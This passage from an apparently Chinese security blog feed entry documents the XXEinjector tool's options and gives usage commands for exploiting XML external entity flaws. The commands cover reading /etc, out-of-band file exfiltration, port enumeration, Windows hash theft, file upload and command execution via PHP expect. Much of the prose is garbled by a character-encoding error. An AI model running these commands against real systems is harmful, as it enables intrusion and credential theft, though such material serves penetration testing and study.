åŒ…å«æœ‰æ•ˆHTTPè¯·æ±‚çš„XMLæ–‡ä»¶ã€‚(--file=/tmp/req.txt)</span><br><span class="line">--path           å¿…å¡«é¡¹-æ˜¯å¦éœ€è¦æšä¸¾ç›®å½• â€“ æšä¸¾è·¯å¾„ã€‚(--path=/etc)</span><br><span class="line">--brute          å¿…å¡«é¡¹-æ˜¯å¦éœ€è¦çˆ†ç ´æ–‡ä»¶ -çˆ†ç ´æ–‡ä»¶çš„è·¯å¾„ã€‚(--brute=/tmp/brute.txt)</span><br><span class="line">--logger        è®°å½•è¾“å‡ºç»“æœã€‚</span><br><span class="line">--rhost          è¿œç¨‹ä¸»æœºIPæˆ–åŸŸååœ°å€ã€‚(--rhost=192.168.0.3)</span><br><span class="line">--rport          è¿œç¨‹ä¸»æœºçš„TCPç«¯å£ä¿¡æ¯ã€‚(--rport=8080)</span><br><span class="line">--phpfilter    åœ¨å‘é€æ¶ˆæ¯ä¹‹å‰ä½¿ç”¨PHPè¿‡æ»¤å™¨å¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡ŒBase64ç¼–ç ã€‚</span><br><span class="line">--netdoc     ä½¿ç”¨netdocåè®®ã€‚(Java).</span><br><span class="line">--enumports   æšä¸¾ç”¨äºåå‘é“¾æ¥çš„æœªè¿‡æ»¤ç«¯å£ã€‚(--enumports=21,22,80,443,445)</span><br><span class="line">--hashes       çªƒå–è¿è¡Œå½“å‰åº”ç”¨ç¨‹åºç”¨æˆ·çš„Windowså“ˆå¸Œã€‚</span><br><span class="line">--expect        ä½¿ç”¨PHP expectæ‰©å±•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚(--expect=<span class="built_in">ls</span>)</span><br><span class="line">--upload       ä½¿ç”¨Java jarå‘ä¸´æ—¶ç›®å½•ä¸Šä¼ æ–‡ä»¶ã€‚(--upload=/tmp/upload.txt)</span><br><span class="line">--xslt      XSLTæ³¨å…¥æµ‹è¯•ã€‚</span><br><span class="line">--ssl              ä½¿ç”¨SSLã€‚</span><br><span class="line">--proxy         ä½¿ç”¨ä»£ç†ã€‚(--proxy=127.0.0.1:8080)</span><br><span class="line">--httpport Setè‡ªå®šä¹‰HTTPç«¯å£ã€‚(--httpport=80)</span><br><span class="line">--ftpport       è®¾ç½®è‡ªå®šä¹‰FTPç«¯å£ã€‚(--ftpport=21)</span><br><span class="line">--gopherport  è®¾ç½®è‡ªå®šä¹‰gopherç«¯å£ã€‚(--gopherport=70)</span><br><span class="line">--jarport       è®¾ç½®è‡ªå®šä¹‰æ–‡ä»¶ä¸Šä¼ ç«¯å£ã€‚(--jarport=1337)</span><br><span class="line">--xsltport  è®¾ç½®è‡ªå®šä¹‰ç”¨äºXSLTæ³¨å…¥æµ‹è¯•çš„ç«¯å£ã€‚(--xsltport=1337)</span><br><span class="line">--<span class="built_in">test</span>     è¯¥æ¨¡å¼å¯ç”¨äºæµ‹è¯•è¯·æ±‚çš„æœ‰æ•ˆã€‚</span><br><span class="line">--urlencode     URLç¼–ç ï¼Œé»˜è®¤ä¸ºURIã€‚</span><br><span class="line">--output       çˆ†ç ´æ”»å‡»ç»“æœè¾“å‡ºå’Œæ—¥å¿—ä¿¡æ¯ã€‚(--output=/tmp/out.txt)</span><br><span class="line">--<span class="built_in">timeout</span>     è®¾ç½®æ¥æ”¶æ–‡ä»¶/ç›®å½•å†…å®¹çš„Timeoutã€‚(--<span class="built_in">timeout</span>=20)</span><br><span class="line">--contimeout  è®¾ç½®ä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥çš„ï¼Œé˜²æ­¢DoSå‡ºç°ã€‚(--contimeout=20)</span><br><span class="line">--fast     è·³è¿‡æšä¸¾è¯¢é—®ï¼Œæœ‰å¯èƒ½å‡ºç°ç»“æœå‡é˜³æ€§ã€‚</span><br><span class="line">--verbose     æ˜¾ç¤ºverboseä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><h2 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h2><p>æšä¸¾HTTPSåº”ç”¨ç¨‹åºä¸­çš„&#x2F;etcç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt â€“ssl</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨gopherï¼ˆOOBæ–¹æ³•ï¼‰æšä¸¾&#x2F;etcç›®å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher</span><br></pre></td></tr></table></figure><p>äºŒæ¬¡æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨HTTPå¸¦å¤–æ–¹æ³•å’Œnetdocåè®®å¯¹æ–‡ä»¶è¿›è¡Œçˆ†ç ´æ”»å‡»ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http â€“netdoc</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç›´æ¥æ€§æ¼æ´åˆ©ç”¨æ–¹å¼è¿›è¡Œèµ„æºæšä¸¾ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK</span><br></pre></td></tr></table></figure><p>æšä¸¾æœªè¿‡æ»¤çš„ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all</span><br></pre></td></tr></table></figure><p>çªƒå–Windowså“ˆå¸Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt â€“hashes</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨Java jarä¸Šä¼ æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨PHP expectæ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•XSLTæ³¨å…¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt â€“xslt</span><br></pre></td></tr></table></figure><p>è®°å½•è¯·æ±‚ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XML-XXEæ¼æ´&quot;&gt;&lt;a href=&quot;#XML-XXEæ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;XML XXEæ¼æ´&quot;&gt;&lt;/a&gt;XML XXEæ¼æ´&lt;/h1&gt;&lt;h2 id=&quot;åŸºç¡€æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#åŸºç¡€æ¦‚å¿µ&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="Web" scheme="https://iahzl.github.io/categories/Web/"/>
    
    
    <category term="XML" scheme="https://iahzl.github.io/tags/XML/"/>
    
    <category term="XXE" scheme="https://iahzl.github.io/tags/XXE/"/>
    
  </entry>
  
</feed>
